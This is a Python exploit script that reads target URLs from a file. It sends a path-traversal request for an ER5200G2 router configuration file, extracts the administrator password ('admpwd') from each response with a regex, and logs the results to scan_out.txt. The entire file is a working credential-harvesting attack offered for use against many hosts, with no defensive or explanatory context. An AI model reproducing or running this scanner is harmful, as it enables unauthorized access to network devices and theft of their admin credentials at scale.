#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : Lem
import urllib.request
import re
import requests
import io
import sys


def get_poc(poc):
	poc="/userLogin.asp/%2e%2e/actionpolicy_status/%2e%2e/ER5200G2.cfg"
	return(poc)


def scan_urls(result,poc):
	poc=get_poc(poc)
	result=readfiles()

	for url in result:
		scan=str(url)+poc
		print(scan)
		try:
			resu = requests.get(scan, timeout=1).text
			print(requests.get(scan, timeout=1).status_code)
			if requests.get(scan, timeout=1).status_code == 200:
				find_list = re.findall(r'admpwd=(.+?)\n', resu)
				print(find_list)
				file_handle = open('scan_out.txt', mode='a')
				a = scan+"-"+str(find_list)
				file_handle.write(a)
				file_handle.write('\n')
			else:
				print("不存在admpwd")
		except:
			print("请检查目标列表")


def readfiles():
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return(result)


if __name__ == '__main__':
	result=[]
	poc=""
	scan_urls(result,poc)

